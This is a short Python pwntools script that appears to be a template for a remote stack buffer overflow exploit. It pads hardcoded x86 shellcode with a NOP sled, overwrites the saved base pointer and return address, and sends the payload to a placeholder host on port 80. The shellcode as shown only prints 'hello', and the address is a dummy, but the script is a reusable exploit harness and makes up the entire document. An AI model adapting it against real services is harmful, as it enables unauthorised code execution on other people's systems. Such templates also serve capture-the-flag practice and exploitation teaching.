from pwn import *
import re

NOP = "\x90"

# =========================== VARIABLES ======================================
# Length of the vuln buffer
BUFFER_LEN = 100

# Shellcode to execute here. 
SHELLCODE = ""
SHELLCODE += "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3"
SHELLCODE += "\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd"
SHELLCODE += "\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"
# ===========================================================================

def gen_shellcode(ret_address):
    """
    Generates the actual shellcode payload
    """
    
    if len(SHELLCODE) > BUFFER_LEN:
        print("Error: Shellcode is too big for the buffer!\n")
        exit()

    # Space to fill with nop instruction
    padding_len = BUFFER_LEN - len(SHELLCODE)
    padding_str = (NOP * padding_len)

    output = padding_str
    output += SHELLCODE
    output += "\x41\x41\x41\x41" # Overwrite the base pointer
    output += ret_address
    
    return output

r = remote("IP", 80)

# Example gen of the payload
payload = gen_shellcode("\xff\xff\xff\xff")

print(r.read())

r.send(payload)